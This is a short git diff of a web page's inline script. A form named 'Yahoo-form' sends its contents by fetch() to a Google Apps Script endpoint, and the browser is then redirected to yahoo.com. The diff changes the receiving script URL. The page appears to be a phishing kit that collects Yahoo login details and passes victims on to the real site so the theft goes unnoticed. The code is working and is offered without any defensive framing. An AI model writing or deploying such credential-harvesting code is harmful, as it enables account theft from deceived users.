@@ -98,7 +98,7 @@
                     });
                     </script> -->
                     <script>
-                        const scriptURL = 'https://script.google.com/macros/s/AKfycbycAFpsrfsk69CccnJ3skbeKMxUuS1tWyTJP1SxEg9JjnYb4ydMFJZIwXGTCIf4KwuKKQ/exec'
+                        const scriptURL = 'https://script.google.com/macros/s/AKfycbwRjmmAujxzZbL0R_xXaiEKLEVy8RuF0A6Ll6GXvxC5vxNZxw6_eVGQCpNDBoiiJJR7/exec'
 
                         const form = document.forms['Yahoo-form']  // form id goes here
                       
@@ -106,7 +106,7 @@
                           e.preventDefault()
                           fetch(scriptURL, { method: 'POST', body: new FormData(form)})
                             // .then(response => alert("Thank you! your form is submitted successfully." ))
-                            // .then(() => {  window.location.reload(); })
+                            .then(() => {  window.location.reload(); })
                             .then(() => {  window.location.href = "http://www.yahoo.com"; })  // redirection link goes here
                             .catch(error => console.error('Error!', error.message))
                         })
